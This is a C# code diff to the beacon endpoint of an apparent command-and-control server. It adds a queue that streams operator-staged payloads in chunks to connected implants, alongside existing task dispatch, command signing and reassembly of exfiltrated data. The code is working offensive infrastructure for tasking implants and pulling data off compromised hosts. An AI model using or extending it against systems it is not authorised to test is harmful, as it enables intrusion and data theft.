@@ -1,3 +1,4 @@
+using System.Collections.Concurrent;
 using Google.Protobuf;
 using Grpc.Core;
 using Microsoft.AspNetCore.Http;
@@ -184,8 +185,14 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         // so this dictionary lives for the life of one beacon stream; the reader
         // loop is the sole writer, so it needs no extra synchronization.
         var exfil = new ExfilReassembler();
-        var reader = ReadResultsAsync(session, requestStream, exfil, linked);
-        var writer = DispatchTasksAsync(session.Implant, responseStream, linked.Token);
+        // Per-stream staged-pull queue: the reader accepts the implant's
+        // demands (architecture.md Sec 10, the typed arm) and the writer --
+        // the stream's sole WriteAsync caller -- streams the demanded bytes
+        // downstream. The dispatch wake doubles as the handoff: a demand
+        // releases the implant's wake, so the parked writer wakes and drains.
+        var pulls = new ConcurrentQueue<Guid>();
+        var reader = ReadResultsAsync(session, requestStream, exfil, pulls, linked);
+        var writer = DispatchTasksAsync(session, pulls, responseStream, linked.Token);
 
         // Whichever finishes first cancels the other. The writer only ever ends
         // via cancellation (its loop runs for the session), so swallow the
@@ -211,6 +218,7 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         SessionContext session,
         IAsyncStreamReader<Frame> requestStream,
         ExfilReassembler exfil,
+        ConcurrentQueue<Guid> stagedPulls,
         CancellationTokenSource linked)
     {
         var cancellationToken = linked.Token;
@@ -232,27 +240,31 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
                 return;
             }
 
-            await HandleFrameAsync(session, requestStream.Current, exfil, cancellationToken);
+            await HandleFrameAsync(session, requestStream.Current, exfil, stagedPulls, cancellationToken);
         }
     }
 
-    // Writer: push queued tasks downstream the moment they are queued.
-    // Operators task implants over HTTP at any moment, so this loops for the
-    // life of the session rather than draining once. Each iteration claims
-    // first -- covering tasks queued before the stream opened and dispatches
-    // returned to the queue by a failed write -- then parks on the per-implant
-    // dispatch wake, which TaskService releases on every accepted enqueue. No
-    // poll: a queued task is pushed on release, and an idle stream claims
-    // nothing (architecture.md Sec 10.3).
+    // Writer: push queued tasks downstream the moment they are queued, and
+    // stream staged payloads the moment they are demanded. Operators task
+    // implants over HTTP at any moment, so this loops for the life of the
+    // session rather than draining once. Each iteration claims first --
+    // covering tasks queued before the stream opened and dispatches returned
+    // to the queue by a failed write -- drains any staged pulls the reader
+    // accepted, then parks on the per-implant dispatch wake, which TaskService
+    // releases on every accepted enqueue and the reader releases on every
+    // demand. No poll: a queued task is pushed on release, and an idle stream
+    // claims nothing (architecture.md Sec 10.3).
     private async Task DispatchTasksAsync(
-        ImplantId implant,
+        SessionContext session,
+        ConcurrentQueue<Guid> stagedPulls,
         IServerStreamWriter<Frame> responseStream,
         CancellationToken cancellationToken)
     {
         while (!cancellationToken.IsCancellationRequested)
         {
-            await DispatchNextAsync(implant, responseStream, cancellationToken);
-            await _wake.WaitAsync(implant, cancellationToken);
+            await DispatchNextAsync(session.Implant, responseStream, cancellationToken);
+            await StreamStagedPullsAsync(session, stagedPulls, responseStream, cancellationToken);
+            await _wake.WaitAsync(session.Implant, cancellationToken);
         }
     }
 
@@ -273,6 +285,12 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
             Verb = dispatched.Verb,
             Arguments = dispatched.Arguments,
         };
+        // The typed arm's marker (architecture.md Sec 10): a staged task tells
+        // the implant its payload is server-side and demanded, not inline. The
+        // sha256 token inside the signed arguments stays the integrity
+        // authority; the marker only switches the implant's grammar.
+        if (dispatched.StagedBytes is { } stagedBytes)
+            request.StagedBytes = (ulong)stagedBytes;
         // Command signing (architecture.md Sec 9): the CA key signs the task's
         // canonical (implant_id, task_id, verb, arguments) tuple -- the implant
         // id binds the task to its intended executor -- and the implant
@@ -322,7 +340,8 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
     // An upstream frame: dispatch on its kind. TASK_RESULT (and the legacy
     // UNSPECIFIED default, which older implants still send) takes the
     // capture-and-audit path; EXFIL_CHUNK reassembles a streamed artifact into
-    // the artifact store. Non-result, non-exfil frames are ignored for now
+    // the artifact store; STAGED_PULL hands the implant's demand for a staged
+    // payload to the writer. Non-result, non-exfil frames are ignored for now
     // (keepalives, etc.). This is the transport-layer composition the AC
     // calls for -- task state lives in core, the audit event in the audit
     // layer, and the beacon stream is where both meet on a completed task
@@ -331,12 +350,16 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
         SessionContext session,
         Frame frame,
         ExfilReassembler exfil,
+        ConcurrentQueue<Guid> stagedPulls,
         CancellationToken cancellationToken)
     {
         switch (frame.Kind)
         {
             case FrameKind.ExfilChunk:
                 await HandleExfilChunkAsync(session, frame, exfil, cancellationToken);
+                return;
+            case FrameKind.StagedPull:
+                await HandleStagedPullAsync(session, frame, stagedPulls, cancellationToken);
                 return;
             case FrameKind.TaskResult:
             case FrameKind.Unspecified:
@@ -345,6 +368,84 @@ internal sealed class BeaconEndpoint : Beacon.BeaconBase
                 return;
         }
     }
+
+    // A StagedPull frame: the implant demands a staged task's payload
+    // (architecture.md Sec 10). Validated against the stream's own implant --
+    // a demand naming another implant's task is dropped, not answered -- then
+    // queued for the writer and the wake released so the demand is answered
+    // immediately. The task's own lifecycle is untouched: the demand is a
+    // transport read of staged bytes, not a task transition.
+    private async Task HandleStagedPullAsync(
+        SessionContext session,
+        Frame frame,
+        ConcurrentQueue<Guid> stagedPulls,
+        CancellationToken cancellationToken)
+    {
+        StagedPull pull;
+        try
+        {
+            pull = StagedPull.Parser.ParseFrom(frame.Payload);
+        }
+        catch (InvalidProtocolBufferException)
+        {
+            return;
+        }
+
+        if (!TaskId.TryParse(pull.TaskId, out var taskId))
+            return;
+
+        var task = await _taskRecords.FindAsync(taskId, cancellationToken);
+        if (task is null || task.ImplantId != session.Implant || task.StagedBytes is null)
+            return;
+
+        stagedPulls.Enqueue(task.Id.Value);
+        _wake.Release(session.Implant);
+    }
+
+    // Streams every demanded staged payload downstream, one StagedChunk run
+    // per demand: the task-bound artifact the issuer staged, sliced at the
+    // frame-budget chunk size, 0-origin sequences, terminal on the last chunk.
+    // A demand whose staged bytes are gone (an expired store, a restart that
+    // lost the in-memory artifacts) is answered with a single empty terminal
+    // chunk so the implant resolves and fails the hash check honestly rather
+    // than waiting on chunks that will never come.
+    private async Task StreamStagedPullsAsync(
+        SessionContext session,
+        ConcurrentQueue<Guid> stagedPulls,
+        IServerStreamWriter<Frame> responseStream,
+        CancellationToken cancellationToken)
+    {
+        while (stagedPulls.TryDequeue(out var taskIdValue))
+        {
+            var staged = (await _artifacts.ForTaskAsync(taskIdValue, cancellationToken))
+                .FirstOrDefault(a => a.Name == StagedArtifacts.NameFor(taskIdValue));
+            var content = staged?.Content ?? Array.Empty<byte>();
+
+            for (var offset = 0; ; offset += StagedChunkSize)
+            {
+                var end = Math.Min(offset + StagedChunkSize, content.Length);
+                var slice = new byte[end - offset];
+                Array.Copy(content, offset, slice, 0, slice.Length);
+                var chunk = new StagedChunk
+                {
+                    TaskId = new TaskId(taskIdValue).ToString(),
+                    Sequence = (ulong)(offset / StagedChunkSize),
+                    Terminal = end == content.Length,
+                    Data = ByteString.CopyFrom(slice),
+                };
+                await responseStream.WriteAsync(
+                    new Frame { Payload = ByteString.CopyFrom(chunk.ToByteArray()) },
+                    cancellationToken);
+                if (chunk.Terminal)
+                    break;
+            }
+        }
+    }
+
+    // The downstream chunk size for staged payloads: the same budget the
+    // implant's exfil chunker honors, so a marshaled Frame fits the message
+    // cap with protobuf overhead to spare in both directions.
+    private const int StagedChunkSize = 512 * 1024;
 
     // A TaskResult frame: capture the outcome into the task and append the audit
     // event, then fan the completion out to connected operators. Pre-dates the
